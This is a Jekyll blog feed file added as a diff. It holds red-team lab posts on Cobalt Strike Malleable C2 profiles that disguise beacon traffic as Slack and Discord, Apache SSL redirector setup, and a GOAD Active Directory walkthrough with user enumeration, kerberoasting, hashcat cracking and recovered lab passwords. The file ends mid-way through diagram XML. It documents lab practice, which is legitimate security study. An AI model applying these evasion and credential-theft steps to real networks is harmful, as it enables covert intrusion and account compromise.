@@ -1,0 +1,1603 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-01-04T20:22:15+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Dcodezero</title><subtitle> </subtitle><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><entry><title type="html">Cobalt Strike Malleable C2 Profiles</title><link href="http://localhost:4000/red-team/Malleable-c2-pro/" rel="alternate" type="text/html" title="Cobalt Strike Malleable C2 Profiles" /><published>2024-12-25T00:00:00+05:30</published><updated>2024-12-25T00:00:00+05:30</updated><id>http://localhost:4000/red-team/Malleable-c2-pro</id><content type="html" xml:base="http://localhost:4000/red-team/Malleable-c2-pro/"><![CDATA[<h1 id="overview">Overview</h1>
+
+<p>Beacon’s HTTP indicators are controlled by a Malleable Command and Control (Malleable C2) profile. A Malleable C2 profile is a simple program that specifies how to transform data and store it in a transaction. The same profile that transforms and stores data, interpreted backwards, also extracts and recovers data from a transaction.</p>
+
+<p>To use a custom profile, you must start a Cobalt Strike team server and specify your profile at that time.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./teamserver [external IP] [password] [/path/to/my.profile]
+</code></pre></div></div>
+
+<p>You may only load one profile per Cobalt Strike instance.</p>
+
+<p>Malleable C2 is a domain specific language to redefine indicators in Beacon’s communication. This repository is a collection of Malleable C2 profiles that you may use. These profiles work with Cobalt Strike 3.x.</p>
+
+<h3 id="slack-and-discord-simulation-profiles"><strong>Slack and Discord Simulation Profiles</strong></h3>
+
+<h4 id="purpose"><strong>Purpose</strong></h4>
+<p>These profiles are designed to simulate HTTP communication patterns resembling Slack and Discord traffic. They aim to improve operational security (OPSEC) by mimicking legitimate application behavior to evade detection in network monitoring environments.</p>
+
+<hr />
+
+<ul>
+  <li>The profiles utilize dynamic URIs for both HTTP GET and POST requests.</li>
+  <li>
+    <p>A metadata block is used to prepend and append channel-specific identifiers (e.g., <code class="language-plaintext highlighter-rouge">channel-&lt;dynamic&gt;-dynamic</code>) to create the appearance of real-time channel activity.</p>
+  </li>
+  <li>HTTP GET traffic uses a Slack-specific user-agent: <code class="language-plaintext highlighter-rouge">Slack/4.23.0 (Mac OS X 10.15.7)</code>.</li>
+  <li>
+    <p>HTTP POST traffic uses a Discord-specific user-agent: <code class="language-plaintext highlighter-rouge">Discord/1.0 (Linux; Android 10; Scale/3.0)</code>.</p>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">spawnto_x86</code> and <code class="language-plaintext highlighter-rouge">spawnto_x64</code> are set to <code class="language-plaintext highlighter-rouge">taskhostw.exe</code>, a legitimate Windows process, instead of the highly scrutinized <code class="language-plaintext highlighter-rouge">svchost.exe</code>.</li>
+  <li>
+    <p>The <code class="language-plaintext highlighter-rouge">host_stage</code> parameter is disabled (<code class="language-plaintext highlighter-rouge">false</code>) to avoid exposing payloads to unauthorized parties.</p>
+  </li>
+  <li>The certificates mimic Slack and Discord services:
+    <ul>
+      <li>For Slack: <code class="language-plaintext highlighter-rouge">CN="slack.com"</code>, <code class="language-plaintext highlighter-rouge">O="Slack Technologies, LLC"</code>.</li>
+      <li>Valid for 365 days to appear realistic.</li>
+    </ul>
+  </li>
+  <li>Authorization headers include tokens (<code class="language-plaintext highlighter-rouge">Bearer &lt;bot-token&gt;</code> and <code class="language-plaintext highlighter-rouge">Bearer &lt;user-token&gt;</code>) to simulate API usage.</li>
+  <li>
+    <p>Headers like <code class="language-plaintext highlighter-rouge">Content-Type</code>, <code class="language-plaintext highlighter-rouge">Accept</code>, and <code class="language-plaintext highlighter-rouge">User-Agent</code> are customized to match Slack and Discord API patterns.</p>
+  </li>
+  <li>GET and POST responses are encoded in Base64 and prefixed with keywords (e.g., <code class="language-plaintext highlighter-rouge">response_</code>, <code class="language-plaintext highlighter-rouge">msg_send_</code>) to mimic legitimate payloads.</li>
+  <li>The traffic mimics typical JSON API responses.</li>
+</ul>
+
+<h3 class="notice--info" id="you-can-find-the-c2-profiles-in-my-github-repo-c2-profiles">You can find the C2-Profiles in my github repo: <a href="https://github.com/DcodeZero/c2-profiles/">C2-Profiles</a></h3>
+
+<hr />
+<h4 id="traffic-example"><strong>Traffic Example</strong></h4>
+<p><strong>HTTP-GET Request:</strong></p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/api/v9/channels/channel-123456-dynamic</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">slack.com</span>
+<span class="na">Authorization</span><span class="p">:</span> <span class="s">Bearer &lt;bot-token&gt;</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Slack/4.23.0 (Mac OS X 10.15.7)</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">application/json</span>
+</code></pre></div></div>
+
+<p><strong>HTTP-POST Request:</strong></p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/api/v9/channels/channel-123456-dynamic</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">discord.com</span>
+<span class="na">Authorization</span><span class="p">:</span> <span class="s">Bearer &lt;user-token&gt;</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Discord/1.0 (Linux; Android 10; Scale/3.0)</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
+</code></pre></div></div>
+<hr />
+
+<h4 id="real-time-example">Real Time Example:</h4>
+
+<p>Once the profile is loaded with cobalt-strike. Create a listner with port 80. The reason to use port 80 is just for demonstration purposes.</p>
+
+<h4 id="listner-config">listner config</h4>
+
+<p><img src="/assets/images/sample/homelab/C2-profile/2.png" alt="2.png" /></p>
+
+<h4 id="beacon-call-back-from-victim">Beacon call back from victim</h4>
+
+<p><img src="/assets/images/sample/homelab/C2-profile/1.png" alt="1.png" /></p>
+
+<p>Open wireshark on the victim machine and check for traffic.</p>
+
+<p><img src="/assets/images/sample/homelab/C2-profile/3.png" alt="3.png" /></p>
+
+<p>Select the destination address and port number.</p>
+
+<p><img src="/assets/images/sample/homelab/C2-profile/4.png" alt="4.png" /></p>
+
+<p>right click and check for follow TCP-stream</p>
+
+<p><img src="/assets/images/sample/homelab/C2-profile/5.png" alt="5.png" /></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="Red-Team" /><category term="HomeLab" /><category term="IT" /><category term="RED-Team" /><summary type="html"><![CDATA[Hide from blue team like a pro by using malleable c2 profiles.]]></summary></entry><entry><title type="html">Cobalt Strike Redirectors using Apache-SSL</title><link href="http://localhost:4000/red-team/redirectors/" rel="alternate" type="text/html" title="Cobalt Strike Redirectors using Apache-SSL" /><published>2024-12-19T00:00:00+05:30</published><updated>2024-12-19T00:00:00+05:30</updated><id>http://localhost:4000/red-team/redirectors</id><content type="html" xml:base="http://localhost:4000/red-team/redirectors/"><![CDATA[<h1 id="overview">Overview</h1>
+
+<p>Redirectors are systems designed to proxy traffic from a target network to private attack infrastructure. They play a vital role in ensuring operational security and serve several key purposes:</p>
+
+<h4 id="1-preventing-unauthorized-access"><strong>1. Preventing Unauthorized Access</strong></h4>
+<p>Redirectors act as a shield, preventing unauthorized parties from accessing the underlying attack infrastructure. They can:<br />
+Only allow authorized users or systems to connect to the actual infrastructure.<br />
+Make the infrastructure appear harmless or unrelated to its real purpose, deterring unwanted attention.</p>
+
+<h4 id="2-shaping-how-the-infrastructure-appears"><strong>2. Shaping How the Infrastructure Appears</strong></h4>
+<p>Redirectors control how the target perceives the infrastructure by:<br />
+Modifying content, headers, or other elements to make traffic appear legitimate and unsuspicious.<br />
+Mimicking well-known platforms or architectures to blend in and avoid detection.</p>
+
+<h4 id="3-safeguarding-the-attack-chain"><strong>3. Safeguarding the Attack Chain</strong></h4>
+<p>By acting as a buffer, redirectors help ensure that the overall attack chain remains intact, even if a part of it is exposed. They achieve this by:<br />
+Keeping different parts of the infrastructure separate to minimize the risk of exposure.<br />
+Hiding communication patterns to make it harder to trace or identify the destination.<br />
+Providing a way to swiftly redirect traffic to backup systems if a redirector is compromised.</p>
+
+<p>In red team operations, penetration testing, or other offensive security scenarios, redirectors are essential. They offer a blend of protection, control, and flexibility, making them a cornerstone of effective attack frameworks.</p>
+
+<h3 id="4-cobalt-strike-redirectors-using-apache-ssl"><strong>4. Cobalt Strike Redirectors using Apache-SSL</strong></h3>
+
+<h2 id="step--01">Step – 01</h2>
+
+<p>On the cobalt strike team server, we’ve to generate two files. <code class="language-plaintext highlighter-rouge">public.crt</code> and <code class="language-plaintext highlighter-rouge">private.key</code>.</p>
+
+<div class="language-plaintext notice--info highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@teamserver: openssl req -new -newkey rsa:4096 -x509 -sha256 -days 365 -nodes -out public.crt -keyout private.key
+</code></pre></div></div>
+
+<p>Once the command is executed,  you will be presented with the below prompts.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Country Name (2 letter code) [AU]: 
+State or Province Name (full name) [Some-State]:
+Locality Name (eg, city) []:
+Organization Name (eg, company) [Internet Widgits Pty Ltd]: 
+Organizational Unit Name (eg, section) []:
+Common Name (e.g. server FQDN or YOUR name) []: 172.16.100.3
+Email Address []:
+</code></pre></div></div>
+
+<p>Here the common name can be the domain you own. for my case I’m just using the ip of my teamserver.</p>
+
+<p><img src="/assets/images/sample/Cobaltstrike/1.png" alt="1.png" /></p>
+
+<p>now copy both the files from your teamsever to the redirector machines <code class="language-plaintext highlighter-rouge">/etc/apache2/ssl</code> 
+by creating an ssl folder.</p>
+
+<h2 id="step--02">Step – 02</h2>
+
+<p class="notice--info"><code class="language-plaintext highlighter-rouge">root@redirector1: sudo apt install apache2</code></p>
+<p class="notice--info"><code class="language-plaintext highlighter-rouge">root@redirector1: sudo a2enmod ssl rewrite proxy proxy_http</code></p>
+<p class="notice--info"><code class="language-plaintext highlighter-rouge">root@redirector1:~# mkdir -p /etc/apache2/ssl</code></p>
+<p><img src="/assets/images/sample/Cobaltstrike/2.png" alt="2.png" /></p>
+
+<p class="notice--info"><code class="language-plaintext highlighter-rouge">root@redirector1: sudo nano /etc/apache2/sites-available/default-ssl.conf</code></p>
+
+<p><img src="/assets/images/sample/Cobaltstrike/3.png" alt="3.png" /></p>
+
+<p>Example of default-ssl.conf</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;IfModule mod_ssl.c&gt;
+    &lt;VirtualHost *:443&gt;
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html
+        
+        SSLEngine on
+        SSLProxyEngine on
+        SSLProxyCheckPeerCN off
+        SSLCertificateFile /etc/apache2/ssl/Your-Team-server.crt
+        SSLCertificateKeyFile /etc/apache2/ssl/Your-Team-server.key
+        
+        &lt;Directory /var/www/html&gt;
+            Options Indexes FollowSymLinks MultiViews
+            AllowOverride All
+            Require all granted
+        &lt;/Directory&gt;
+        
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+    &lt;/VirtualHost&gt;
+&lt;/IfModule&gt;
+</code></pre></div></div>
+
+<p>Make sure to have these in the default-ssl.conf
+<code class="language-plaintext highlighter-rouge">SSLEngine on</code>
+<code class="language-plaintext highlighter-rouge">SSLProxyEngine on</code>
+<code class="language-plaintext highlighter-rouge">SSLProxyCheckPeerCN off</code></p>
+
+<p class="notice--info"><code class="language-plaintext highlighter-rouge">root@redirector1: sudo systemctl restart apache2</code></p>
+
+<p>Now open a browser and open https://redirector1. you should see apache now running with <code class="language-plaintext highlighter-rouge">SSL</code>.</p>
+
+<p><img src="/assets/images/sample/Cobaltstrike/4.png" alt="4.png" /></p>
+
+<p>Quick thing to check in here if you’ve the right certificate is that by checking the cert. your should see your <code class="language-plaintext highlighter-rouge">team-server</code> ip or the <code class="language-plaintext highlighter-rouge">FQDN</code> in the certificate.</p>
+
+<p><img src="/assets/images/sample/Cobaltstrike/5.png" alt="5.png" /></p>
+
+<h2 id="step--03">Step – 03</h2>
+
+<p>Now for the team-sever to communicate with our apache ssl. As <code class="language-plaintext highlighter-rouge">cobalt-strike</code> is written in java, the public certificate and private key need to be imported into a Java KeyStore.</p>
+
+<p>First, we need to combine the separate public and private files into a single PKCS12 file.  Set the password to anything you want, but remember it.</p>
+
+<p class="notice--info"><code class="language-plaintext highlighter-rouge">root@teamserevr: openssl pkcs12 -inkey private.key -in public.crt -export -out tserver.pkcs12</code></p>
+
+<p>You will be prompter to enter password:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Enter Export Password:
+Verifying - Enter Export Password:
+</code></pre></div></div>
+
+<p>Do enter the password you can remember. Once done, you’ll see a file called <code class="language-plaintext highlighter-rouge">tserver.pkcs12</code></p>
+
+<p>That PKCS12 file can then be converted to a Java KeyStore using the <code class="language-plaintext highlighter-rouge">keytool</code> utility.</p>
+
+<p class="notice--info"><code class="language-plaintext highlighter-rouge">root@teamserevr: keytool -importkeystore -srckeystore tserver.pkcs12 -srcstoretype pkcs12 -destkeystore tserver.store</code></p>
+
+<p>You’ll be prompted asking to enter the password. You can use the same password as before. make sure you remember it as we’ll be using it in the <code class="language-plaintext highlighter-rouge">Malleable-C2-Profiles</code>.</p>
+
+<p>The password of this new store can be the same or different.  At this point, the <code class="language-plaintext highlighter-rouge">.pkcs12</code> file can be deleted.  The new Java KeyStore needs to be referenced in a Malleable C2 profile before it can be used.</p>
+
+<p>https-certificate {
+     set keystore “tserver.store”;
+     set password “password”;
+}</p>
+
+<p>The Cobalt Strike Team Server expects the KeyStore to be in the same directory as itself.  Launch the Team Server with the updated profile.</p>
+
+<p class="notice--info"><code class="language-plaintext highlighter-rouge">root@teamserver: ./teamserver IP-address passwword@123 apt.profile</code></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="Red-Team" /><category term="HomeLab" /><category term="IT" /><category term="RED-Team" /><summary type="html"><![CDATA[This is how you setup single or multiple redirectors for Cobalt-Strike using malleable-c2 profiles and Apache SSL]]></summary></entry><entry><title type="html">Game of Active Directory - Part 3 [Recon]</title><link href="http://localhost:4000/goad/GOAD-p3/" rel="alternate" type="text/html" title="Game of Active Directory - Part 3 [Recon]" /><published>2024-12-14T00:00:00+05:30</published><updated>2024-12-14T00:00:00+05:30</updated><id>http://localhost:4000/goad/GOAD-p3</id><content type="html" xml:base="http://localhost:4000/goad/GOAD-p3/"><![CDATA[<h4 id="previously">Previously:</h4>
+<p>Found two user names and passwords for the users, <code class="language-plaintext highlighter-rouge">Samwell.tarly</code> and <code class="language-plaintext highlighter-rouge">Brandon.stark</code>.</p>
+
+<p>Note: A good thing to note in here is to not use any password spraying as there is a high 
+chance of blocking the users. Its always a good practice to look at the password policy of the domain.</p>
+
+<p><code class="language-plaintext highlighter-rouge">crackmapexec smb winterfell --pass-pol</code>
+or
+<code class="language-plaintext highlighter-rouge">netexec smb winterfell --pass-pol</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─# netexec smb winterfell --pass-pol
+SMB         172.16.100.51   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
+SMB         172.16.100.51   445    WINTERFELL       [+] Dumping password info for domain: NORTH
+SMB         172.16.100.51   445    WINTERFELL       Minimum password length: 5
+SMB         172.16.100.51   445    WINTERFELL       Password history length: 24
+SMB         172.16.100.51   445    WINTERFELL       Maximum password age: 311 days 2 minutes 
+SMB         172.16.100.51   445    WINTERFELL       
+SMB         172.16.100.51   445    WINTERFELL       Password Complexity Flags: 000000
+SMB         172.16.100.51   445    WINTERFELL           Domain Refuse Password Change: 0
+SMB         172.16.100.51   445    WINTERFELL           Domain Password Store Cleartext: 0
+SMB         172.16.100.51   445    WINTERFELL           Domain Password Lockout Admins: 0
+SMB         172.16.100.51   445    WINTERFELL           Domain Password No Clear Change: 0
+SMB         172.16.100.51   445    WINTERFELL           Domain Password No Anon Change: 0
+SMB         172.16.100.51   445    WINTERFELL           Domain Password Complex: 0
+SMB         172.16.100.51   445    WINTERFELL       
+SMB         172.16.100.51   445    WINTERFELL       Minimum password age: 1 day 4 minutes 
+SMB         172.16.100.51   445    WINTERFELL       Reset Account Lockout Counter: 5 minutes 
+SMB         172.16.100.51   445    WINTERFELL       Locked Account Duration: 5 minutes 
+SMB         172.16.100.51   445    WINTERFELL       Account Lockout Threshold: 5
+SMB         172.16.100.51   445    WINTERFELL       Forced Log off Time: Not Set
+</code></pre></div></div>
+
+<p>From above we can see that the password policy says if we <strong>fail 5 times in 5 minutes</strong> we lock the accounts for 5 minutes.</p>
+
+<p>From here there are two ways to check for the other attacks.
+<code class="language-plaintext highlighter-rouge">1. Kerberoasting</code>
+<code class="language-plaintext highlighter-rouge">2. Check for possible RDP to Winterfell using the gained creds</code>
+<code class="language-plaintext highlighter-rouge">3. Drop in sharphound to check for other cool stuff</code></p>
+
+<h2 id="we-shall-start-with-finding-more-users-in-the-domains">We shall start with finding more users in the domain/s</h2>
+
+<p>As we’ve found some users lets see, if we can find more users in the domain/s and see what can we get from those creds.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>From MayFly’s blogs:</td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>When you get an account on an active directory, the first thing to do is always getting the full list of users.</li>
+  <li>Once you get it you could do a password spray on the full user list (very often you will find other accounts with weak password like username=password, SeasonYear!, SocietynameYear! or even 123456).</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GetADUsers.py -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+[*] Querying north.sevenkingdoms.local for information about domain.
+Name                  Email                           PasswordLastSet      LastLogon           
+--------------------  ------------------------------  -------------------  -------------------
+Administrator                                         2022-06-29 00:32:20.901897  2022-07-01 17:48:41.983605 
+Guest                                                 &lt;never&gt;              &lt;never&gt;             
+vagrant                                               2021-05-12 13:38:55.922520  2022-07-01 12:08:35.223885 
+krbtgt                                                2022-06-29 00:48:58.950440  &lt;never&gt;             
+arya.stark                                            2022-06-29 07:48:08.060667  2022-07-03 17:40:06.721358 
+eddard.stark                                          2022-06-29 07:48:11.560625  2022-07-04 23:33:27.976702 
+catelyn.stark                                         2022-06-29 07:48:15.013735  &lt;never&gt;             
+robb.stark                                            2022-06-29 07:48:18.544972  2022-07-04 23:35:50.678794 
+sansa.stark                                           2022-06-29 07:48:21.607059  &lt;never&gt;             
+brandon.stark                                         2022-06-29 07:48:24.278459  2022-07-04 23:36:08.991489 
+rickon.stark                                          2022-06-29 07:48:26.966809  &lt;never&gt;             
+hodor                                                 2022-06-29 07:48:29.670052  2022-07-04 23:21:58.774078 
+jon.snow                                              2022-06-29 07:48:32.373101  2022-07-03 17:36:26.798060 
+samwell.tarly                                         2022-06-29 07:48:35.107476  2022-07-01 16:35:17.043960 
+jeor.mormont                                          2022-06-29 07:48:37.841846  &lt;never&gt;             
+sql_svc                                               2022-06-29 07:48:40.248028  2022-07-03 15:56:57.924607
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>With ldap query, i recommend this article with all the useful ldap query for active directory : <a href="https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/">https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/</a></p>
+  </li>
+  <li>
+    <p>With ldap on north.sevenkingdoms.local</p>
+  </li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch -H ldap://172.16.100.51 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=north,DC=sevenkingdoms,DC=local' "(&amp;(objectCategory=person)(objectClass=user))" |grep 'distinguishedName:'
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>With ldap query we can request users of the others domain because a trust is present.</p>
+  </li>
+  <li>
+    <p>On essos.local</p>
+  </li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch -H ldap://172.16.100.52 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b ',DC=essos,DC=local' "(&amp;(objectCategory=person)(objectClass=user))"
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch -H ldap://172.16.100.50 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=sevenkingdoms,DC=local' "(&amp;(objectCategory=person)(objectClass=user))"
+</code></pre></div></div>
+
+<h2 id="kerberoasting">Kerberoasting</h2>
+
+<ul>
+  <li>
+    <p>On an active directory, we will see very often users with an SPN set.</p>
+  </li>
+  <li>
+    <p>let’s find them with impacket</p>
+  </li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+ServicePrincipalName                                 Name      MemberOf                                                    PasswordLastSet             LastLogon                   Delegation  
+---------------------------------------------------  --------  ----------------------------------------------------------  --------------------------  --------------------------  -----------
+CIFS/winterfell.north.sevenkingdoms.local            jon.snow  CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2022-06-29 07:48:32.373101  2022-06-29 10:34:54.308171  constrained 
+HTTP/thewall.north.sevenkingdoms.local               jon.snow  CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2022-06-29 07:48:32.373101  2022-06-29 10:34:54.308171  constrained 
+MSSQLSvc/castelblack.north.sevenkingdoms.local       sql_svc                                                               2022-06-29 07:48:40.248028  2022-06-29 22:54:57.422114              
+MSSQLSvc/castelblack.north.sevenkingdoms.local:1433  sql_svc                                                               2022-06-29 07:48:40.248028  2022-06-29 22:54:57.422114
+</code></pre></div></div>
+
+<p>All the hashes will be stored in the file named kerberoasting.hashes</p>
+
+<ul>
+  <li>we could also do that with cme with the following command</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cme ldap 192.168.56.11 -u brandon.stark -p 'iseedeadpeople' -d north.sevenkingdoms.local --kerberoasting KERBEROASTING
+</code></pre></div></div>
+
+<ul>
+  <li>Now let’s try to crack the hashes</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force
+</code></pre></div></div>
+
+<p>Creds Found:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user : north/jon.snow:iknownothing
+</code></pre></div></div>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="GOAD" /><category term="GOAD" /><category term="HomeLab" /><category term="Active-Drirectory" /><summary type="html"><![CDATA[GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to practice usual attack techniques.]]></summary></entry><entry><title type="html">RED-TEAM Home-Lab Infra</title><link href="http://localhost:4000/red-team/RED-TEAM-Infra/" rel="alternate" type="text/html" title="RED-TEAM Home-Lab Infra" /><published>2024-12-14T00:00:00+05:30</published><updated>2024-12-14T00:00:00+05:30</updated><id>http://localhost:4000/red-team/RED-TEAM-Infra</id><content type="html" xml:base="http://localhost:4000/red-team/RED-TEAM-Infra/"><![CDATA[<p>After looking at a bunch of blogs from the other security folks about RED-Teaming. It started to bug my mind that how is all the setup done form the infrastructure side of things.</p>
+
+<p>Taking the advantage from the experience of creating a home lab environment, using multiple hypervisors and networking. I decided to have my own infrastructure in my home lab. This home lab will contain a lot of things that will be related to starting from..</p>
+
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">Networking</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Multiple VMs</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Multiple DMZs</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Isolations</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Netowork traffic</code></li>
+  <li><code class="language-plaintext highlighter-rouge">The victim network</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Attacking infrstructure</code> which will contain
+    <ol>
+      <li><code class="language-plaintext highlighter-rouge">Single/Multiple Redirectors</code></li>
+      <li><code class="language-plaintext highlighter-rouge">The attack box</code>
+        <ol>
+          <li><code class="language-plaintext highlighter-rouge">Windows Machine</code></li>
+          <li><code class="language-plaintext highlighter-rouge">Linux [Kali]</code></li>
+        </ol>
+      </li>
+    </ol>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">Assumed Public Cloud infrastructure</code>
+    <ol>
+      <li><code class="language-plaintext highlighter-rouge">This is where the redirectors stay</code></li>
+    </ol>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">Using Pfsense firewall</code> to accomplish all the above activity.</li>
+</ol>
+
+<p>I’ve divided the Infra into 3 Parts, which is as follows.</p>
+
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">Victim-Network</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Assumed Public-Cloud</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Attacking-Network</code></li>
+</ol>
+
+<p>From the previous home-lab blog, I’ve showed the configuration of the <code class="language-plaintext highlighter-rouge">HP-Proliant</code> enterprise grade server. This server is a beast to run all the number of <code class="language-plaintext highlighter-rouge">virtual machines</code> that I wanted to execute for the infra.</p>
+
+<blockquote>
+  <p>Interested how the setup looks like? <a href="https://dcodezero.github.io/it/Homelab/">Check it</a></p>
+</blockquote>
+
+<p>Below are some of the things that I strictly wanted to have in my LAB. This helps my in defining the things for further or future upgrades that I wanted to have in my LAB.</p>
+
+<ol>
+  <li>Attacker network should not directly talk or communicate with the victim network.</li>
+  <li>Victim network should not directly talk or communicate with the Attacker network.</li>
+  <li>The <code class="language-plaintext highlighter-rouge">Victim or the attacker</code> networks can only communicate to the <code class="language-plaintext highlighter-rouge">public cloud</code>.</li>
+  <li>Here the bridge/communication between these two networks is only via <code class="language-plaintext highlighter-rouge">Public Cloud-Network</code>.</li>
+  <li>Due to security constraints/reasons, the victim network only allow the egress traffic to the <code class="language-plaintext highlighter-rouge">public cloud</code> via port <code class="language-plaintext highlighter-rouge">443</code> <code class="language-plaintext highlighter-rouge">HTTPS</code>.</li>
+  <li>Along the other side to keep the attacking infra safe, the attacking network will only communicate to the <code class="language-plaintext highlighter-rouge">Public cloud</code> via <code class="language-plaintext highlighter-rouge">22</code> <code class="language-plaintext highlighter-rouge">SSH</code> by tunneling the traffic using redirectors.</li>
+</ol>
+
+<p>I’ve created a small Network Diagram to show how the idea is going to work.</p>
+
+<html><head><title>RTIL.drawio.html</title><meta charset="utf-8" /></head><body>
+    <div class="mxgraph" style="max-width:100%;border:1px solid transparent;" data-mxgraph="{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;xml&quot;:&quot;&lt;mxfile host=\&quot;app.diagrams.net\&quot; agent=\&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1.1 Safari/605.1.15\&quot; version=\&quot;25.0.3\&quot;&gt;&lt;diagram name=\&quot;Page-1\&quot; id=\&quot;J8HO-rfsxQq54d3A0VBy\&quot;&gt;&lt;mxGraphModel dx=\&quot;1224\&quot; dy=\&quot;774\&quot; grid=\&quot;1\&quot; gridSize=\&quot;10\&quot; guides=\&quot;1\&quot; tooltips=\&quot;1\&quot; connect=\&quot;1\&quot; arrows=\&quot;1\&quot; fold=\&quot;1\&quot; page=\&quot;1\&quot; pageScale=\&quot;1\&quot; pageWidth=\&quot;827\&quot; pageHeight=\&quot;1169\&quot; math=\&quot;0\&quot; shadow=\&quot;0\&quot;&gt;&lt;root&gt;&lt;mxCell id=\&quot;0\&quot;/&gt;&lt;mxCell id=\&quot;1\&quot; parent=\&quot;0\&quot;/&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-1\&quot; value=\&quot;\&quot; style=\&quot;verticalLabelPosition=bottom;sketch=0;html=1;fillColor=#A153A0;strokeColor=#ffffff;verticalAlign=top;align=center;points=[[0,0.5,0],[0.125,0.25,0],[0.25,0,0],[0.5,0,0],[0.75,0,0],[0.875,0.25,0],[1,0.5,0],[0.875,0.75,0],[0.75,1,0],[0.5,1,0],[0.125,0.75,0]];pointerEvents=1;shape=mxgraph.cisco_safe.compositeIcon;bgIcon=mxgraph.cisco_safe.design.blank_device;resIcon=mxgraph.cisco_safe.design.ms_active_directory;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;604.13\&quot; y=\&quot;160\&quot; width=\&quot;100\&quot; height=\&quot;90\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-3\&quot; 